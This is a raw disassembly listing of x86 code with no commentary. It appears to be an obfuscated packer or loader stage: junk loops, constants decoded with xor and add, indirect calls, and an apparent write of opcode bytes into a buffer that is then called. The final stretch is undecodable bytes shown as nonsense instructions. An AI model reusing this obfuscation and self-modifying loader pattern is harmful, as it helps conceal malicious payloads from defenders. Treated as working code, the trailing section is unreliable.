  40e855:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  40e85c:	sbb    DWORD PTR ds:0x4345bf,0x434507
  40e866:	lea    eax,[ebp-0x2c]
  40e869:	movzx  ecx,BYTE PTR ds:0x4344f3
  40e870:	and    ecx,DWORD PTR ds:0x4345cf
  40e876:	mov    DWORD PTR ds:0x4344f3,ecx
  40e87c:	mov    DWORD PTR [ebp-0x18],eax
  40e87f:	mov    DWORD PTR ds:0x434547,0x13
  40e889:	cmp    DWORD PTR ds:0x434547,0x0
  40e890:	je     0x40e94f
  40e896:	cmp    DWORD PTR ds:0x434547,0x3
  40e89d:	jne    0x40e8b6
  40e8a3:	push   0x8243
  40e8a8:	push   0x5b51
  40e8ad:	push   DWORD PTR [ebp-0x18]
  40e8b0:	call   DWORD PTR ds:0x4130cc
  40e8b6:	cmp    DWORD PTR ds:0x434547,0x4
  40e8bd:	jne    0x40e8d0
  40e8c3:	mov    esi,DWORD PTR ds:0x434547
  40e8c9:	dec    esi
  40e8ca:	mov    DWORD PTR ds:0x434547,esi
  40e8d0:	xor    esi,esi
  40e8d2:	add    esi,DWORD PTR ds:0x434547
  40e8d8:	dec    esi
  40e8d9:	mov    DWORD PTR ds:0x434547,esi
  40e8df:	jmp    0x40e889
  40e8e4:	and    DWORD PTR ds:0x43457b,0x0
  40e8ee:	jmp    0x40e900
  40e8f3:	mov    edi,DWORD PTR ds:0x43457b
  40e8f9:	inc    edi
  40e8fa:	mov    DWORD PTR ds:0x43457b,edi
  40e900:	cmp    DWORD PTR ds:0x43457b,0x19
  40e907:	jae    0x40e94f
  40e90d:	cmp    DWORD PTR ds:0x43457b,0xd
  40e914:	jne    0x40e92a
  40e91a:	push   0x6845
  40e91f:	push   0x4346f3
  40e924:	call   DWORD PTR ds:0x41334c
  40e92a:	cmp    DWORD PTR ds:0x43457b,0xc
  40e931:	jne    0x40e944
  40e937:	mov    edi,DWORD PTR ds:0x43457b
  40e93d:	inc    edi
  40e93e:	mov    DWORD PTR ds:0x43457b,edi
  40e944:	jmp    0x40e8f3
  40e949:	sub    DWORD PTR ds:0x43453f,edi
  40e94f:	lea    eax,[ebp-0x30]
  40e952:	mov    ecx,DWORD PTR ds:0x434587
  40e958:	adc    DWORD PTR ds:0x4345b7,ecx
  40e95e:	mov    DWORD PTR [ebp-0x14],eax
  40e961:	mov    esi,DWORD PTR ds:0x43451b
  40e967:	xor    ecx,ecx
  40e969:	or     ecx,DWORD PTR ds:0x434557
  40e96f:	sub    esi,ecx
  40e971:	or     esi,DWORD PTR [esi+ecx*1]
  40e974:	mov    eax,ds:0x414afe
  40e979:	mov    ebx,DWORD PTR ds:0x4345b3
  40e97f:	mov    ebx,DWORD PTR [ebx]
  40e981:	sub    DWORD PTR ds:0x4344ff,ebx
  40e987:	mov    eax,DWORD PTR [eax+0x1c8]
  40e98d:	mov    eax,DWORD PTR [eax]
  40e98f:	or     edi,0x2360
  40e995:	mov    ecx,DWORD PTR [ebp-0x14]
  40e998:	mov    esi,0x7510851
  40e99d:	and    DWORD PTR ds:0x434547,0x6472
  40e9a7:	xor    eax,esi
  40e9a9:	sbb    edi,DWORD PTR ds:0x4344fb
  40e9af:	mov    edi,0x327299
  40e9b4:	xor    DWORD PTR ds:0x4344fb,ebx
  40e9ba:	add    eax,edi
  40e9bc:	mov    DWORD PTR [ecx],eax
  40e9be:	mov    eax,ds:0x414dae
  40e9c3:	movzx  ebx,WORD PTR ds:0x4345f7
  40e9ca:	cmp    eax,0x22c02f45
  40e9cf:	mov    eax,DWORD PTR [ebp-0x4]
  40e9d2:	movzx  ebx,BYTE PTR ds:0x4345c7
  40e9d9:	mov    ebx,0xf89c853a
  40e9de:	je     0x40ea1a
  40e9e4:	sub    DWORD PTR ds:0x4345ff,edi
  40e9ea:	mov    ecx,DWORD PTR [ebp-0x24]
  40e9ed:	xor    eax,esi
  40e9ef:	add    eax,edi
  40e9f1:	sbb    DWORD PTR ds:0x434603,0x3fff
  40e9fb:	imul   eax,ecx
  40e9fe:	mov    DWORD PTR ds:0x4344f7,0x22e4
  40ea08:	mov    DWORD PTR [ebp-0x24],eax
  40ea0b:	mov    DWORD PTR ds:0x434547,0x3208
  40ea15:	jmp    0x40eab6
  40ea1a:	add    DWORD PTR ds:0x4345bf,0x154a
  40ea24:	xor    eax,esi
  40ea26:	sbb    DWORD PTR ds:0x434547,0x7bc1
  40ea30:	add    eax,edi
  40ea32:	mov    ds:0x414c12,eax
  40ea37:	movzx  eax,BYTE PTR ds:0x4345bb
  40ea3e:	sub    DWORD PTR ds:0x4345bf,eax
  40ea44:	mov    eax,DWORD PTR [ebp-0x24]
  40ea47:	xor    eax,esi
  40ea49:	adc    DWORD PTR ds:0x43458f,ebx
  40ea4f:	add    eax,edi
  40ea51:	not    ecx
  40ea53:	mov    ds:0x414dae,eax
  40ea58:	mov    eax,DWORD PTR [ebp-0x4]
  40ea5b:	mov    ecx,DWORD PTR ds:0x414c12
  40ea61:	xor    eax,esi
  40ea63:	xor    DWORD PTR ds:0x434503,0x4345c3
  40ea6d:	add    eax,edi
  40ea6f:	mov    DWORD PTR ds:0x43458b,0x4a46
  40ea79:	cmp    ecx,eax
  40ea7b:	jne    0x40eab6
  40ea81:	sbb    DWORD PTR ds:0x434503,0x43454f
  40ea8b:	push   ebx
  40ea8c:	mov    DWORD PTR ds:0x4345bf,0x49e8
  40ea96:	push   DWORD PTR [ebp-0x4]
  40ea99:	sbb    DWORD PTR ds:0x43453f,0x7dd1
  40eaa3:	push   DWORD PTR [ebp-0x24]
  40eaa6:	adc    DWORD PTR ds:0x4344ef,0x434503
  40eab0:	call   DWORD PTR ds:0x414c0a
  40eab6:	and    edx,DWORD PTR ds:0x434503
  40eabc:	mov    eax,ds:0x414afe
  40eac1:	mov    ecx,DWORD PTR ds:0x434593
  40eac7:	and    DWORD PTR ds:0x434543,ecx
  40eacd:	mov    eax,DWORD PTR [eax+0x18c]
  40ead3:	sub    ecx,edx
  40ead5:	mov    eax,DWORD PTR [eax]
  40ead7:	neg    ecx
  40ead9:	mov    DWORD PTR [ebp-0x44],eax
  40eadc:	mov    DWORD PTR [ebp-0x10],ebx
  40eadf:	sub    ecx,DWORD PTR ds:0x43460f
  40eae5:	mov    DWORD PTR [ebp-0x10],ebx
  40eae8:	and    DWORD PTR ds:0x43453f,0x0
  40eaf2:	jmp    0x40eb04
  40eaf7:	mov    ecx,DWORD PTR ds:0x43453f
  40eafd:	inc    ecx
  40eafe:	mov    DWORD PTR ds:0x43453f,ecx
  40eb04:	cmp    DWORD PTR ds:0x43453f,0x1d
  40eb0b:	jae    0x40eb61
  40eb11:	cmp    DWORD PTR ds:0x43453f,0x7
  40eb18:	jne    0x40eb2c
  40eb1e:	push   DWORD PTR [ebp-0x18]
  40eb21:	push   0x7577
  40eb26:	call   DWORD PTR ds:0x4130d0
  40eb2c:	cmp    DWORD PTR ds:0x43453f,0x6
  40eb33:	jne    0x40eb48
  40eb39:	xor    ecx,ecx
  40eb3b:	add    ecx,DWORD PTR ds:0x43453f
  40eb41:	inc    ecx
  40eb42:	mov    DWORD PTR ds:0x43453f,ecx
  40eb48:	jmp    0x40eaf7
  40eb4d:	xor    edx,edx
  40eb4f:	or     edx,DWORD PTR ds:0x434547
  40eb55:	sbb    edx,DWORD PTR ds:0x434607
  40eb5b:	mov    DWORD PTR ds:0x434547,edx
  40eb61:	mov    DWORD PTR [ebp-0x10],ebx
  40eb64:	mov    ecx,DWORD PTR ds:0x43460b
  40eb6a:	or     DWORD PTR ds:0x4345bb,ecx
  40eb70:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  40eb77:	or     eax,edx
  40eb79:	mov    DWORD PTR [ebp-0x10],ebx
  40eb7c:	mov    DWORD PTR [ebp-0x10],0xf89c853e
  40eb83:	xor    ecx,DWORD PTR ds:0x434537
  40eb89:	mov    eax,DWORD PTR [ebp-0x24]
  40eb8c:	and    edx,0x522c
  40eb92:	mov    ecx,DWORD PTR [ebp-0x4]
  40eb95:	and    DWORD PTR ds:0x43460f,edx
  40eb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40eb9e:	or     DWORD PTR ds:0x43460b,0x4345c7
  40eba8:	xor    edx,esi
  40ebaa:	sub    DWORD PTR ds:0x43454f,0x434507
  40ebb4:	xor    ecx,esi
  40ebb6:	adc    DWORD PTR ds:0x4345bf,0x4345fb
  40ebc0:	add    ecx,edx
  40ebc2:	mov    edx,DWORD PTR [ebp-0x4]
  40ebc5:	adc    DWORD PTR ds:0x4344f7,0x434577
  40ebcf:	xor    eax,esi
  40ebd1:	xor    edx,esi
  40ebd3:	adc    DWORD PTR ds:0x4344e3,0x6faf
  40ebdd:	add    eax,edi
  40ebdf:	mov    DWORD PTR ds:0x434583,0x13
  40ebe9:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ebf0:	mov    DWORD PTR ds:0x43453b,0x74ca
  40ebfa:	mov    DWORD PTR [ebp-0x20],eax
  40ebfd:	mov    DWORD PTR ds:0x434543,0x777a
  40ec07:	cmp    eax,ecx
  40ec09:	mov    DWORD PTR ds:0x434613,0x6f86
  40ec13:	ja     0x40ed7b
  40ec19:	jmp    0x40ec27
  40ec1e:	adc    DWORD PTR ds:0x43457b,edi
  40ec24:	mov    eax,DWORD PTR [ebp-0x20]
  40ec27:	add    DWORD PTR ds:0x434603,0x32bd
  40ec31:	mov    ecx,DWORD PTR [ebp-0x4]
  40ec34:	xor    ecx,esi
  40ec36:	xor    DWORD PTR ds:0x4344e7,0x43458f
  40ec40:	lea    eax,[ecx+eax*1+0x327299]
  40ec47:	push   eax
  40ec48:	and    DWORD PTR ds:0x434593,0x0
  40ec52:	xor    eax,eax
  40ec54:	or     eax,DWORD PTR ds:0x434593
  40ec5a:	inc    eax
  40ec5b:	mov    ds:0x434593,eax
  40ec60:	cmp    DWORD PTR ds:0x434593,0x10
  40ec67:	jne    0x40ec76
  40ec6d:	push   DWORD PTR [ebp-0x1c]
  40ec70:	call   DWORD PTR ds:0x413350
  40ec76:	cmp    DWORD PTR ds:0x434593,0xf
  40ec7d:	jne    0x40ec91
  40ec83:	xor    eax,eax
  40ec85:	add    eax,DWORD PTR ds:0x434593
  40ec8b:	inc    eax
  40ec8c:	mov    ds:0x434593,eax
  40ec91:	cmp    DWORD PTR ds:0x434593,0x1c
  40ec98:	jb     0x40ec52
  40ec9e:	movzx  eax,BYTE PTR ds:0x4344e3
  40eca5:	adc    eax,DWORD PTR ds:0x43457b
  40ecab:	mov    ds:0x4344e3,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x14]
  40ecb3:	xor    eax,esi
  40ecb5:	mov    DWORD PTR ds:0x43453f,0x3b17
  40ecbf:	lea    eax,[ebp+eax*1+0x3272a1]
  40ecc6:	sub    DWORD PTR ds:0x4345f7,0x434503
  40ecd0:	push   eax
  40ecd1:	and    eax,DWORD PTR ds:0x43457b
  40ecd7:	mov    eax,ds:0x414afe
  40ecdc:	adc    DWORD PTR ds:0x434537,0x7c2
  40ece6:	push   DWORD PTR [eax+0x1bc]
  40ecec:	call   0x4028d7
  40ecf1:	mov    eax,DWORD PTR [ebp-0x4]
  40ecf4:	mov    ecx,DWORD PTR [ebp-0x20]
  40ecf7:	mov    edx,DWORD PTR ds:0x4345fb
  40ecfd:	or     DWORD PTR ds:0x434613,edx
  40ed03:	xor    eax,esi
  40ed05:	lea    eax,[ecx+eax*1+0x327299]
  40ed0c:	mov    ecx,DWORD PTR [ebp-0x4]
  40ed0f:	or     DWORD PTR ds:0x434543,edi
  40ed15:	mov    edx,DWORD PTR [ebp-0x4]
  40ed18:	sub    DWORD PTR ds:0x434577,0x283f
  40ed22:	xor    edx,esi
  40ed24:	xor    DWORD PTR ds:0x4345d3,0x434537
  40ed2e:	xor    ecx,esi
  40ed30:	add    ecx,edx
  40ed32:	mov    edx,DWORD PTR [ebp-0x4]
  40ed35:	and    DWORD PTR ds:0x4345f7,0x4344ff
  40ed3f:	xor    edx,esi
  40ed41:	mov    DWORD PTR ds:0x434537,0x5401
  40ed4b:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ed52:	mov    DWORD PTR ds:0x434507,0x25c8
  40ed5c:	mov    DWORD PTR [ebp-0x20],eax
  40ed5f:	mov    DWORD PTR ds:0x43453f,0x56d4
  40ed69:	cmp    eax,ecx
  40ed6b:	mov    DWORD PTR ds:0x434507,0x74b6
  40ed75:	jbe    0x40ec1e
  40ed7b:	mov    DWORD PTR ds:0x4345ff,0x4be2
  40ed85:	mov    eax,DWORD PTR [ebp+0xc]
  40ed88:	add    DWORD PTR ds:0x434607,edx
  40ed8e:	mov    ds:0x414982,eax
  40ed93:	mov    eax,DWORD PTR [ebp+0x10]
  40ed96:	mov    ds:0x414bd6,eax
  40ed9b:	and    DWORD PTR ds:0x4345c7,0x0
  40eda5:	mov    ecx,DWORD PTR ds:0x4345c7
  40edab:	inc    ecx
  40edac:	mov    DWORD PTR ds:0x4345c7,ecx
  40edb2:	cmp    DWORD PTR ds:0x4345c7,0x1f
  40edb9:	jne    0x40edca
  40edbf:	push   0x43485b
  40edc4:	call   DWORD PTR ds:0x413354
  40edca:	cmp    DWORD PTR ds:0x4345c7,0x13
  40edd1:	jb     0x40eda5
  40edd7:	add    ecx,eax
  40edd9:	mov    eax,ds:0x414982
  40edde:	inc    ecx
  40eddf:	mov    ecx,DWORD PTR [ebp-0x18]
  40ede2:	sub    DWORD PTR ds:0x43454f,0x1b10
  40edec:	push   DWORD PTR [ebp-0x44]
  40edef:	or     DWORD PTR ds:0x4345c3,0x4345f7
  40edf9:	sub    eax,edi
  40edfb:	sub    DWORD PTR ds:0x4344ff,0x4344ef
  40ee05:	push   DWORD PTR [ebp-0x30]
  40ee08:	adc    DWORD PTR ds:0x43453b,0x5064
  40ee12:	xor    eax,esi
  40ee14:	mov    DWORD PTR [ecx],eax
  40ee16:	push   DWORD PTR [ebp-0x2c]
  40ee19:	call   0x40f157
  40ee1e:	sub    eax,edi
  40ee20:	adc    ecx,DWORD PTR ds:0x4344ef
  40ee26:	xor    eax,esi
  40ee28:	mov    DWORD PTR ds:0x4344ff,0x13
  40ee32:	cmp    DWORD PTR ds:0x4344ff,0x0
  40ee39:	je     0x40ee7a
  40ee3f:	cmp    DWORD PTR ds:0x4344ff,0x18
  40ee46:	jne    0x40ee68
  40ee4c:	push   0x43485b
  40ee51:	push   DWORD PTR [ebp-0xc]
  40ee54:	push   DWORD PTR [ebp-0x28]
  40ee57:	push   DWORD PTR [ebp-0x1c]
  40ee5a:	push   DWORD PTR [ebp-0x20]
  40ee5d:	push   0x2408
  40ee62:	call   DWORD PTR ds:0x413358
  40ee68:	mov    ecx,DWORD PTR ds:0x4344ff
  40ee6e:	dec    ecx
  40ee6f:	mov    DWORD PTR ds:0x4344ff,ecx
  40ee75:	jmp    0x40ee32
  40ee7a:	mov    DWORD PTR [ebp+0xc],eax
  40ee7d:	mov    ecx,DWORD PTR [ebp-0x4]
  40ee80:	mov    eax,DWORD PTR [ebp+0xc]
  40ee83:	xor    ecx,esi
  40ee85:	add    ecx,edi
  40ee87:	xor    edx,edx
  40ee89:	div    ecx
  40ee8b:	mov    ecx,DWORD PTR [ebp-0x24]
  40ee8e:	cmp    ecx,eax
  40ee90:	jne    0x40f0b9
  40ee96:	mov    eax,ds:0x414afe
  40ee9b:	mov    DWORD PTR [ebp+0x10],eax
  40ee9e:	mov    eax,ds:0x414c0e
  40eea3:	mov    DWORD PTR [ebp-0x50],eax
  40eea6:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40eead:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40eeb4:	mov    DWORD PTR [ebp-0x4c],0xf89cb536
  40eebb:	mov    DWORD PTR [ebp-0x64],0xf89f0536
  40eec2:	mov    DWORD PTR [ebp-0x60],0xf89c85f6
  40eec9:	mov    DWORD PTR [ebp-0x54],0xf89c85d6
  40eed0:	mov    eax,DWORD PTR [ebp-0x18]
  40eed3:	xor    eax,esi
  40eed5:	add    eax,edi
  40eed7:	mov    DWORD PTR [ebp-0xc],eax
  40eeda:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  40eee1:	mov    BYTE PTR [ebp-0x25],0x67
  40eee5:	mov    eax,DWORD PTR [ebp-0x18]
  40eee8:	xor    eax,esi
  40eeea:	add    eax,edi
  40eeec:	mov    DWORD PTR [ebp-0xc],eax
  40eeef:	mov    eax,DWORD PTR [ebp-0x54]
  40eef2:	xor    eax,esi
  40eef4:	add    eax,edi
  40eef6:	mov    DWORD PTR [ebp-0x40],eax
  40eef9:	mov    eax,DWORD PTR [ebp-0x4c]
  40eefc:	xor    eax,esi
  40eefe:	add    eax,edi
  40ef00:	mov    DWORD PTR [ebp-0x38],eax
  40ef03:	mov    eax,DWORD PTR [ebp-0x3c]
  40ef06:	xor    eax,esi
  40ef08:	add    eax,edi
  40ef0a:	mov    DWORD PTR [ebp-0x34],eax
  40ef0d:	lea    eax,[ebp-0xa8]
  40ef13:	mov    DWORD PTR [ebp+0xc],eax
  40ef16:	mov    eax,DWORD PTR [ebp-0x18]
  40ef19:	mov    DWORD PTR [ebp-0x14],eax
  40ef1c:	mov    eax,DWORD PTR [ebp-0x20]
  40ef1f:	mov    DWORD PTR [ebp-0x5c],ebx
  40ef22:	mov    DWORD PTR [ebp-0x10],eax
  40ef25:	mov    eax,DWORD PTR [ebp-0x5c]
  40ef28:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef2b:	xor    eax,esi
  40ef2d:	add    eax,0x327299
  40ef32:	mov    DWORD PTR [ecx],eax
  40ef34:	mov    eax,DWORD PTR [ebp-0x14]
  40ef37:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef3a:	xor    eax,esi
  40ef3c:	add    eax,edi
  40ef3e:	mov    DWORD PTR [ecx+0x4],eax
  40ef41:	mov    eax,DWORD PTR [ebp-0x34]
  40ef44:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef47:	mov    DWORD PTR [ecx+0x8],eax
  40ef4a:	mov    eax,DWORD PTR [ebp-0x38]
  40ef4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef50:	mov    DWORD PTR [ecx+0xc],eax
  40ef53:	mov    eax,DWORD PTR [ebp-0x40]
  40ef56:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef59:	mov    DWORD PTR [ecx+0x10],eax
  40ef5c:	mov    eax,eax
  40ef5e:	mov    eax,DWORD PTR [ebp-0x10]
  40ef61:	xor    eax,esi
  40ef63:	add    eax,edi
  40ef65:	je     0x40ef96
  40ef6b:	lea    eax,[ebp-0xa8]
  40ef71:	push   eax
  40ef72:	mov    eax,DWORD PTR [ebp-0x20]
  40ef75:	xor    eax,esi
  40ef77:	add    eax,edi
  40ef79:	push   eax
  40ef7a:	mov    eax,DWORD PTR [ebp+0x10]
  40ef7d:	add    eax,0xaa
  40ef82:	push   eax
  40ef83:	mov    eax,DWORD PTR [ebp+0x10]
  40ef86:	mov    eax,DWORD PTR [eax+0x198]
  40ef8c:	push   DWORD PTR [eax]
  40ef8e:	call   0x411333
  40ef93:	mov    DWORD PTR [ebp-0x8],eax
  40ef96:	cmp    DWORD PTR [ebp-0x8],0x0
  40ef9a:	je     0x40f0b9
  40efa0:	lea    eax,[ebp-0xc]
  40efa3:	mov    DWORD PTR [ebp-0x38],eax
  40efa6:	mov    eax,DWORD PTR [ebp-0x60]
  40efa9:	xor    eax,esi
  40efab:	add    eax,edi
  40efad:	mov    DWORD PTR [ebp-0x40],eax
  40efb0:	mov    eax,DWORD PTR [ebp-0x3c]
  40efb3:	xor    eax,esi
  40efb5:	add    eax,edi
  40efb7:	mov    DWORD PTR [ebp-0x10],eax
  40efba:	mov    eax,DWORD PTR [ebp-0x8]
  40efbd:	mov    DWORD PTR [ebp-0x14],eax
  40efc0:	lea    eax,[ebp-0xa8]
  40efc6:	mov    DWORD PTR [ebp+0xc],eax
  40efc9:	mov    eax,DWORD PTR [ebp-0x18]
  40efcc:	mov    DWORD PTR [ebp-0x18],eax
  40efcf:	mov    eax,DWORD PTR [ebp-0x20]
  40efd2:	mov    DWORD PTR [ebp-0x48],ebx
  40efd5:	mov    DWORD PTR [ebp-0x34],eax
  40efd8:	mov    eax,DWORD PTR [ebp-0x48]
  40efdb:	mov    ecx,DWORD PTR [ebp+0xc]
  40efde:	xor    eax,esi
  40efe0:	add    eax,0x327299
  40efe5:	mov    DWORD PTR [ecx],eax
  40efe7:	mov    eax,DWORD PTR [ebp-0x14]
  40efea:	mov    ecx,DWORD PTR [ebp+0xc]
  40efed:	mov    DWORD PTR [ecx+0x4],eax
  40eff0:	mov    eax,DWORD PTR [ebp-0x10]
  40eff3:	mov    ecx,DWORD PTR [ebp+0xc]
  40eff6:	mov    DWORD PTR [ecx+0x8],eax
  40eff9:	mov    eax,DWORD PTR [ebp-0x40]
  40effc:	mov    ecx,DWORD PTR [ebp+0xc]
  40efff:	mov    DWORD PTR [ecx+0xc],eax
  40f002:	mov    eax,DWORD PTR [ebp-0x38]
  40f005:	mov    ecx,DWORD PTR [ebp+0xc]
  40f008:	mov    DWORD PTR [ecx+0x10],eax
  40f00b:	mov    eax,eax
  40f00d:	mov    eax,DWORD PTR [ebp-0x14]
  40f010:	test   eax,eax
  40f012:	mov    eax,DWORD PTR [ebp-0x34]
  40f015:	jne    0x40f01e
  40f01b:	mov    eax,DWORD PTR [ebp-0x18]
  40f01e:	xor    eax,esi
  40f020:	add    eax,edi
  40f022:	test   eax,eax
  40f024:	je     0x40f052
  40f02a:	lea    eax,[ebp-0xa8]
  40f030:	push   eax
  40f031:	mov    eax,DWORD PTR [ebp-0x20]
  40f034:	xor    eax,esi
  40f036:	add    eax,edi
  40f038:	push   eax
  40f039:	mov    eax,DWORD PTR [ebp+0x10]
  40f03c:	add    eax,0xee
  40f041:	push   eax
  40f042:	mov    eax,DWORD PTR [ebp+0x10]
  40f045:	mov    eax,DWORD PTR [eax+0x198]
  40f04b:	push   DWORD PTR [eax]
  40f04d:	call   0x411333
  40f052:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f055:	xor    ecx,esi
  40f057:	mov    eax,0xffcd8d67
  40f05c:	sub    eax,ecx
  40f05e:	sub    eax,DWORD PTR [ebp-0x8]
  40f061:	mov    ecx,DWORD PTR [ebp-0x50]
  40f064:	add    ecx,eax
  40f066:	mov    eax,DWORD PTR [ebp-0x8]
  40f069:	mov    DWORD PTR [eax+0x1],ecx
  40f06c:	mov    al,BYTE PTR [ebp-0x25]
  40f06f:	mov    ecx,DWORD PTR [ebp-0x8]
  40f072:	xor    al,0x44
  40f074:	sub    al,0x3a
  40f076:	mov    BYTE PTR [ecx],al
  40f078:	lea    eax,[ebp-0x8]
  40f07b:	inc    BYTE PTR [eax]
  40f07d:	inc    eax
  40f07e:	push   eax
  40f07f:	pop    ecx
  40f080:	dec    ecx
  40f081:	xchg   ecx,edx
  40f083:	dec    BYTE PTR [edx]
  40f085:	push   DWORD PTR [ebp+0x10]
  40f088:	mov    eax,ds:0x414bba
  40f08d:	mov    eax,DWORD PTR [eax]
  40f08f:	push   DWORD PTR [eax]
  40f091:	lea    eax,ds:0x414bd6
  40f097:	push   DWORD PTR [eax]
  40f099:	lea    eax,ds:0x414982
  40f09f:	push   DWORD PTR [eax]
  40f0a1:	lea    eax,ds:0x414bb6
  40f0a7:	push   DWORD PTR [eax]
  40f0a9:	lea    eax,ds:0x414cda
  40f0af:	push   DWORD PTR [eax]
  40f0b1:	xchg   ebx,edx
  40f0b3:	inc    ebx
  40f0b4:	push   ebx
  40f0b5:	pop    eax
  40f0b6:	call   DWORD PTR [eax-0x1]
  40f0b9:	lea    eax,[ebp+0x4]
  40f0bc:	mov    DWORD PTR [ebp-0x58],eax
  40f0bf:	mov    eax,ds:0x414afe
  40f0c4:	push   0x4
  40f0c6:	add    eax,0x1cc
  40f0cb:	push   eax
  40f0cc:	lea    eax,[ebp-0x1c]
  40f0cf:	push   eax
  40f0d0:	call   0x4028d7
  40f0d5:	mov    eax,DWORD PTR [ebp-0x1c]
  40f0d8:	mov    eax,DWORD PTR [ebp-0x4]
  40f0db:	mov    eax,DWORD PTR [ebp-0x24]
  40f0de:	mov    DWORD PTR [ebp+0xc],eax
  40f0e1:	mov    eax,ds:0x414b82
  40f0e6:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0e9:	sub    eax,edi
  40f0eb:	xor    eax,esi
  40f0ed:	cmp    eax,ecx
  40f0ef:	je     0x40f136
  40f0f5:	mov    eax,ds:0x414b7a
  40f0fa:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0fd:	sub    eax,edi
  40f0ff:	xor    eax,esi
  40f101:	cmp    eax,ecx
  40f103:	jne    0x40f119
  40f109:	mov    eax,ds:0x414b82
  40f10e:	add    eax,DWORD PTR ds:0x414b7a
  40f114:	jmp    0x40f120
  40f119:	mov    eax,DWORD PTR [ebp+0xc]
  40f11c:	xor    eax,esi
  40f11e:	add    eax,edi
  40f120:	mov    ds:0x414b7a,eax
  40f125:	mov    eax,DWORD PTR [ebp+0xc]
  40f128:	xor    eax,esi
  40f12a:	add    eax,edi
  40f12c:	mov    ds:0x414b82,eax
  40f131:	jmp    0x40f140
  40f136:	mov    eax,ds:0x414b82
  40f13b:	mov    ds:0x414b7a,eax
  40f140:	mov    eax,DWORD PTR [ebp-0x58]
  40f143:	mov    ecx,DWORD PTR ds:0x414b7a
  40f149:	add    DWORD PTR [eax],ecx
  40f14b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f14e:	mov    eax,DWORD PTR [eax]
  40f150:	pop    edi
  40f151:	pop    esi
  40f152:	pop    ebx
  40f153:	leave  
  40f154:	ret    0xc
  40f157:	push   ebp
  40f158:	mov    ebp,esp
  40f15a:	jmp    0x40f4ed
  40f15f:	repz call 0x655e557a
  40f165:	jae    0x40f1d8
  40f167:	hlt    
  40f168:	aaa    
  40f169:	scas   eax,DWORD PTR es:[edi]
  40f16a:	aad    0xc9
  40f16c:	push   ebp
  40f16d:	pop    ecx
  40f16e:	dec    ebp
  40f16f:	and    BYTE PTR [esi+0x79f47e7e],dh
  40f175:	jle    0x40f1f5
  40f177:	push   esp
  40f178:	or     cl,BYTE PTR [eax-0x26]
  40f17b:	mov    ecx,0x32bc9976
  40f180:	inc    esp
  40f181:	test   cl,0x97
  40f184:	mov    edx,0xdb4bd797
  40f189:	mov    WORD PTR [esi],ss
  40f18b:	je     0x40f1ff
  40f18d:	pusha  
  40f18e:	dec    ebp
  40f18f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f190:	mov    bh,0x20
  40f192:	jne    0x40f1de
  40f194:	and    ecx,DWORD PTR ds:0x742b16c3
  40f19a:	mov    BYTE PTR [edi-0x7f37afde],dl
  40f1a0:	lahf   
  40f1a1:	push   eax
  40f1a2:	(bad)  
  40f1a3:	call   0x4963afea
  40f1a8:	and    BYTE PTR [ebp-0x7fc3ecd8],al
  40f1ae:	jmp    0xb090ccb0
  40f1b3:	jns    0x40f217
  40f1b5:	cs sti 
  40f1b7:	fisttp QWORD PTR [esi+0x212588ee]
  40f1bd:	arpl   WORD PTR [esi+esi*1+0x32],ax
  40f1c1:	pop    edx
  40f1c2:	pop    esi
  40f1c3:	mov    ebp,0x1efc9c8d
  40f1c8:	aad    0x86
  40f1ca:	xchg   esp,eax
  40f1cb:	ins    DWORD PTR es:[edi],dx
  40f1cc:	(bad)  
  40f1cd:	iret   
  40f1ce:	(bad)  
  40f1cf:	mov    ch,0x82
  40f1d1:	fs mov ebx,0xfaf6e3f2
  40f1d7:	sahf   
  40f1d8:	mov    ch,0x7a
  40f1da:	add    edx,DWORD PTR [eax]
  40f1dc:	loope  0x40f167
  40f1de:	xor    BYTE PTR [ecx],cl
  40f1e0:	(bad)  
  40f1e1:	stos   DWORD PTR es:[edi],eax
  40f1e2:	jmp    0xfa45612
  40f1e7:	repz int 0xf9
  40f1ea:	cwde   
  40f1eb:	xor    DWORD PTR [eax+0x353137d4],ecx
  40f1f1:	mov    ?,WORD PTR [eax+0x4aca57dd]
  40f1f7:	adc    edi,DWORD PTR [edx-0x57]
  40f1fa:	xchg   esp,eax
  40f1fb:	not    ebx
  40f1fd:	inc    edi
  40f1fe:	or     bl,0x50
  40f201:	addr16 daa 
  40f203:	adc    ecx,ebp
  40f205:	(bad)  
  40f206:	push   ebp
  40f207:	dec    ebx
  40f208:	sub    bh,bl
  40f20a:	xchg   esp,eax
  40f20b:	dec    eax
  40f20c:	enter  0xe21a,0xf7
  40f210:	pop    DWORD PTR [esi+ebp*4+0x4]
  40f214:	push   es
  40f215:	jo     0x40f284
  40f217:	adc    dh,BYTE PTR [ebp*8-0x48ed9a1b]
  40f21e:	jmp    0x9bfd:0xb93de3c8
  40f225:	jge    0x40f1ff
  40f227:	inc    eax
  40f228:	(bad)  
  40f229:	xchg   esp,eax
  40f22a:	inc    esi
  40f22b:	stos   BYTE PTR es:[edi],al
  40f22c:	pop    esp
  40f22d:	mov    esi,0xc6313009
  40f232:	adc    al,0xb2
  40f234:	js     0x40f25f
  40f236:	retf   
  40f237:	and    al,BYTE PTR ds:0x10ed66b0
  40f23d:	inc    esi
  40f23e:	push   esi
  40f23f:	dec    esi
  40f240:	sahf   
  40f241:	jmp    0x1db76efc
  40f246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f247:	int    0x45
  40f249:	xor    bh,BYTE PTR [eax+0x78]
  40f24c:	adc    BYTE PTR [edx],bh
  40f24e:	inc    esp
  40f24f:	leave  
  40f250:	mov    esi,0xd535cfab
  40f255:	or     BYTE PTR ds:[ebx-0x179c5a58],ch
  40f25c:	ret    0x1b49
  40f25f:	enter  0x1630,0xcc
